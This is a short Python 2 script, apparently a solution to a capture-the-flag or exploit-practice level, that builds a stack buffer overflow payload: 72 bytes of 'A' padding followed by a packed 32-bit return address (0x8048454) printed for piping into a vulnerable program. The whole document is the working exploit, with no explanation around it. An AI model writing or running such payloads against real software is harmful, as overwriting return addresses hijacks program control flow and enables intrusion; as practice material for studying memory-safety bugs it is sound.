import struct
#72
padding = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
target_address = struct.pack("I", 0x8048454)
print padding + target_address